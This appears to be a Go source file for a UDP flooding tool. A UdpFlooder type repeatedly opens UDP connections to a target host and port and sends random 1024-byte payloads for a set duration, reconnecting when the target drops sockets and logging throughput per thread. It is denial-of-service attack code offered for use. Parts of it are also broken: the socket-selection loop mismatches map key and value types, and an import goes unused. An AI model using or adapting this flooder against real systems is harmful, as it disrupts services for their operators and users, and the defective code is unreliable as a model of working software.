package internals

import (
	  "math"
	  "math/rand"
	  "net"
	  "strconv"
	  "time"
)

type UdpFlooder struct {
    Host     string
    Port     int
    Duration int
    Interval int
    Sockets  int
    ThreadID int
}

func (flooder *UdpFlooder) Flood() {
  	var total int64 = 0
  	sockets := make(map[string]net.Conn)
  
  	start := time.Now()
  	for time.Since(start) < time.Duration(flooder.Duration)*time.Second {
        if len(sockets) == 0 {
            conn, err := net.Dial("udp", combineHost(flooder.Host, flooder.Port))
    				if err != nil {
    					print_sumthin("failed to establish connection!", ERROR)
    					continue
    				}
    
    				sockets[conn.LocalAddr().String()] = conn
        }

      	// if no sockets were created
    		if len(sockets) == 0 {
      	    print_sumthin("failed to create sockets!", ERROR)
      			return
    		}

        var conn net.Conn

        // even though map iterations are random in Go, this just adds extra randomness.
        num := rand.Intn(len(sockets))
        for i, key := range sockets {
          	if i == num {
          			conn = sockets[key]
          			break
          	}
        }

        n, err := conn.Write([]byte(GenerateRandomPayload(1024)));
        if err != nil {
				  print_sumthin("failed to send request!", ERROR)

				  // assuming that the server forcefully closed our socket
				  conn.Close()
				  delete(sockets, conn.LocalAddr().String())

				  conn, err = net.Dial("udp", combineHost(flooder.Host, flooder.Port))
				  if err != nil {
					    print_sumthin("failed to establish connection!", ERROR)
					    break
				  }

				  sockets[conn.LocalAddr().String()] = conn
			    continue
	    }
      
			total += int64(n)
			print_sumthin("Thread: "+strconv.FormatInt(int64(flooder.ThreadID), 10)+" | Sent/s: "+strconv.FormatFloat(float64(n)/time.Since(start).Seconds(), 'f', 2, 64)+"B | Total: "+strconv.FormatInt(total, 10)+"B | Sockets: "+strconv.FormatInt(int64(len(sockets)), 10), INFO)
    }
}
